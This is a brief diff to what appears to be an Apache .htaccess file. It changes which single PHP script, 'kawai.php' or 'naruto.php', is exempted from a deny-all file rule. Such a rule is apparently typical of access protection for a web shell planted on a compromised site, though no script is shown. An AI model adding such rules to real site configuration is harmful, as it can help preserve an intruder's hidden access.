@@ -25,7 +25,7 @@ Order allow,deny
 deny from all
 </FilesMatch>
 
-<FilesMatch "^(kawai.php)$">
+<FilesMatch "^(naruto.php)$">
     Order Allow,Deny
     Allow from all
 </FilesMatch>
